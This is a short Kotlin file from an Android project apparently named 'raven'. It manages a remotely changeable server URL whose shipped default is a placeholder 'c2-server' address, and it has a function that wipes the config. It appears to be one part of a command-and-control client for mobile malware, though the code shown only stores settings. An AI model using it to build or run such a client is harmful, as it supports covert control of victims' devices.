package com.project.raven

import android.content.Context
import android.content.SharedPreferences

object ConfigManager {
    private const val PREF_NAME = "raven_config"
    private const val KEY_SERVER_URL = "server_url"

    // Fallback/Bootstrap URL (The one you ship with)
    private const val DEFAULT_URL = "https://your-c2-server.herokuapp.com/api/v1"

    private fun getPrefs(context: Context): SharedPreferences {
        return context.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE)
    }

    fun getServerUrl(context: Context): String {
        return getPrefs(context).getString(KEY_SERVER_URL, DEFAULT_URL) ?: DEFAULT_URL
    }

    fun setServerUrl(context: Context, url: String) {
        getPrefs(context).edit().putString(KEY_SERVER_URL, url).apply()
    }

    fun nukeConfig(context: Context) {
        getPrefs(context).edit().clear().apply()
    }
}
